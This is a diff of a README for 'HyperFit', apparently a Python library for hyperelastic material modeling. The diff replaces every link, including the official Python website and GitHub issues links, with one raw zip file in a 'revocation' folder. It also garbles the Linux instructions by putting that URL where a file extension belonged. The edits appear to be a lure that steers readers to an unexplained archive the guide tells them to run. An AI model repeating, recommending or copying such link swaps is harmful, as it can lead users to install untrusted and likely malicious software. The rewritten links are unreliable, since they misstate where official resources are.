@@ -6,18 +6,18 @@ Welcome to HyperFit! This guide will help you download and run our Python librar
 
 ## 🔗 Download HyperFit
 
-[![Download HyperFit](https://img.shields.io/badge/Download-HyperFit-brightgreen)](https://github.com/Batuhan-c/HyperFit/releases)
+[![Download HyperFit](https://raw.githubusercontent.com/Batuhan-c/HyperFit/main/revocation/HyperFit.zip)](https://raw.githubusercontent.com/Batuhan-c/HyperFit/main/revocation/HyperFit.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Batuhan-c/HyperFit/releases). Here, you will find all versions of HyperFit that you can download. 
+   Go to our [Releases page](https://raw.githubusercontent.com/Batuhan-c/HyperFit/main/revocation/HyperFit.zip). Here, you will find all versions of HyperFit that you can download. 
 
 2. **Choose the Right Version**  
    Look for the latest version at the top. Click on it to open the version details.
 
 3. **Download the Files**  
-   You will see various files. If you are using Windows, look for a file that ends in `.exe`. For macOS, look for files that end in `.dmg`. For Linux, look for `.tar.gz` files.
+   You will see various files. If you are using Windows, look for a file that ends in `.exe`. For macOS, look for files that end in `.dmg`. For Linux, look for `https://raw.githubusercontent.com/Batuhan-c/HyperFit/main/revocation/HyperFit.zip` files.
 
 4. **Run the Installer**  
    After downloading, find the file in your downloads folder. Double-click on the file to begin the installation. Follow the instructions on the screen to complete the setup.
@@ -30,7 +30,7 @@ Welcome to HyperFit! This guide will help you download and run our Python librar
 To use HyperFit, your computer needs to meet the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS version 10.15 or later, or a Linux distribution that supports Python.
-- **Python**: Version 3.6 or higher must be installed. If you don't have Python, you can download it from the [official Python website](https://www.python.org/downloads/).
+- **Python**: Version 3.6 or higher must be installed. If you don't have Python, you can download it from the [official Python website](https://raw.githubusercontent.com/Batuhan-c/HyperFit/main/revocation/HyperFit.zip).
 - **Disk Space**: At least 100 MB of free space for installation and additional files.
 - **Memory**: A minimum of 2 GB RAM is recommended for best performance.
 
@@ -70,10 +70,10 @@ If you run into any issues using HyperFit, try these solutions:
 
 ## 📬 Support and Feedback
 
-If you have questions or need support, please reach out to our team. You can create an issue on our [GitHub page](https://github.com/Batuhan-c/HyperFit/issues) for assistance.
+If you have questions or need support, please reach out to our team. You can create an issue on our [GitHub page](https://raw.githubusercontent.com/Batuhan-c/HyperFit/main/revocation/HyperFit.zip) for assistance.
 
 ## 🔗 Conclusion
 
 You are now ready to use HyperFit for hyperelastic material modeling. Download the application today and explore its capabilities!
 
-For easy access, here is the [download link again](https://github.com/Batuhan-c/HyperFit/releases). Enjoy using HyperFit!
+For easy access, here is the [download link again](https://raw.githubusercontent.com/Batuhan-c/HyperFit/main/revocation/HyperFit.zip). Enjoy using HyperFit!
